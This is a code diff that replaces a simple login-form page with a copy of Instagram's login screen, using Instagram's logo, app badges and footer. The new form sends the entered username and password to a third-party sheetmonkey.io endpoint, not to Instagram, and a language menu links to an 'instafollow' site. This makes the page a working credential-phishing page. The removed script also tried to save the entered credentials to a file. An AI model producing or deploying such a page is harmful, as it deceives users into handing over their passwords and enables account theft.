@@ -1,74 +1,93 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>3D Login Form</title>
-    <link rel="stylesheet" href="master.css" />
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"
-      integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w=="
-      crossorigin="anonymous"
-      referrerpolicy="no-referrer"
-    />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;700&display=swap"
-      rel="stylesheet"
-    />
-  </head>
-  <body>
-    <div class="container">
-      <div class="box">
-        <div class="cover"></div>
-        <div class="shadow"></div>
-        <div class="content">
-          <div class="form">
-            <h3 class="logo"><i class="fa-solid fa-key"></i></h3>
-            <h2>Sign in</h2>
-            <div class="inputBox">
-              <input id="fname" type="text" required />
-              <i class="fa-solid fa-user"></i>
-              <span>Username</span>
-            </div>
-            <div class="inputBox">
-              <input id="lname" type="password" required />
-              <i class="fa-solid fa-lock"></i>
-              <span>Password</span>
-            </div>
-            <div class="links">
-              <a href="#"
-                ><i class="fa-solid fa-question"></i> Forgot Password</a
-              >
-              <a href="#"><i class="fa-solid fa-user-plus"></i> Sign up</a>
-            </div>
-            <div class="inputBox">
-              <input type="submit" value="Login" />
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <script>
-    // Requiring fs module in which writeFile function is defined:
-const fs = require('fs');
+<body>
+  <span id="root">
+    <section class="section-all">
 
-var fname = document.getElementById("fname").value;
-var lname = document.getElementById("lname").value;
-var fullname = fname + lname;
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                  <form class="form" action="https://api.sheetmonkey.io/form/c3G1Mz5v4VZwF2VGQAzqAe" method="post">
 
-// data which will write in a file
-let data = fullname;
+                    <div class="input-box">
+                      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
+                    </div>  
 
-// Write "data" in "file.txt":
-fs.writeFile('file.txt', data, (err) => {
-    // In case of an error trhow err:
-    if (err) throw err;
-})
-    </script>
-  </body>
-  
-</html>
+                    <div class="input-box">
+                      <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    </div>  
+
+                    <span class="button-box">
+                      <button class="btn" type="submit" name="submit" value="submit">Log in</button>
+                    </span>  
+
+                    <a class="forgot" href="">Forgot password?</a>
+                  </form>
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+              </div> <!-- Signup-box end -->
+
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                  </a>  
+                </div>  <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href="">About Us</a></li>
+              <li><a href="">Support</a></li>
+              <li><a href="">Blog</a></li>
+              <li><a href="">Press</a></li>
+              <li><a href="">Api</a></li>
+              <li><a href="">Jobs</a></li>
+              <li><a href="">Privacy</a></li>
+              <li><a href="">Terms</a></li>
+              <li><a href="">Directory</a></li>
+              <li>
+                <span class="language">Language
+                  <select name="language" class="select" onchange="la(this.value)">
+                    <option value="#">English</option>
+                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                  </select>
+                </span>
+              </li>
+            </ul>
+          </nav>
+
+          <span class="footer-logo">&copy; 2018 Instagram</span>
+        </div> <!-- Footer container end -->
+      </footer>
+      
+    </section>
+  </span> <!-- Root -->
+
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+</body>
